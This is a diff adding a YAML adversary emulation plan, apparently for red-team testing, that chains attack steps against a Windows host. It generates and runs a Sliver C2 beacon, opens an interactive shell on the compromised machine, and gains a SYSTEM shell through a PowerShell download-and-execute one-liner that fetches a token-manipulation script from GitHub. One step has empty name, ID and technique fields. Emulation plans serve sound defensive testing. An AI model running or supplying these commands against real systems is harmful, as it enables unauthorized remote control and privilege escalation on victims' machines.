@@ -1,0 +1,92 @@
+  - emulation_plan_details:
+      adversary_name: test
+      creation_time: 2024-11-12 06:23:35 UTC+0000
+  - uuid: 972f9f15-94e5-4b3f-a97a-053d1f8f7a98
+    name: Sliver Windows Implant Generation
+    id: T1071.004
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique:
+      - 'Application Layer Protocol: Encrypted Channel'
+    description: |
+      Sliver generates implant for Windows platform and enables mtls monitoring.
+    executor:
+      command: |
+        sliver > generate beacon --arch amd64 --os  windows --mtls 192.168.130.128 --save .
+        sliver > mtls
+    arguments:
+      attacker_ip:
+        default:
+        description: IP address of the attacker machine
+        type:
+      target_platform:
+        default: windows
+        description: The operating system type of the victim machine
+        type:
+    preconditions: []
+    effects:
+      - (prepared_sliver_implant)
+  - uuid: 4a31f8db-89db-4f16-baab-47bb3f9d5b8a
+    name:
+    id:
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Execution
+    technique:
+    description:
+    executor:
+      command: |
+        Manually download the sliver implant and execute it on the victim's machine
+        sliver > sessions -i session_id //interact with a session
+    arguments:
+    preconditions:
+      - (prepared_sliver_implant)
+    effects:
+      - (sliver_session)
+  - uuid: 8315686c-035b-415e-9069-2e14799421e5
+    name: Interactive Shell Access via Sliver
+    id: T1059
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Execution
+    technique: Command and Scripting Interpreter
+    description: In the context of the Sliver framework, the command `shell` is used
+      to open an interactive shell on the compromised machine associated with the
+      active session.
+    executor:
+      command: |
+        sliver (SESSION_NAME) > shell
+    arguments:
+    preconditions:
+      - (sliver_session)
+    effects:
+      - (CAP_powershell_access ?e - executable)
+  - uuid: ccf4ac39-ec93-42be-9035-90e2f26bcd92
+    name: WinPwn - Get SYSTEM shell - Pop System Shell using Token Manipulation technique
+    id: T1134.002
+    source: ART
+    supported_platforms:
+      - windows
+    tactics:
+      - Defense Evasion
+      - Privilege Escalation
+    technique: 'Access Token Manipulation: Create Process with Token'
+    description: Get SYSTEM shell - Pop System Shell using Token Manipulation technique
+      via function of WinPwn
+    executor:
+      command: iex(new-object 
+        net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem
+      name: powershell
+    arguments: []
+    dependencies: []
+    preconditions:
+      - (powershell)
+    effects:
+      - (privilege_escalation ?u - user)
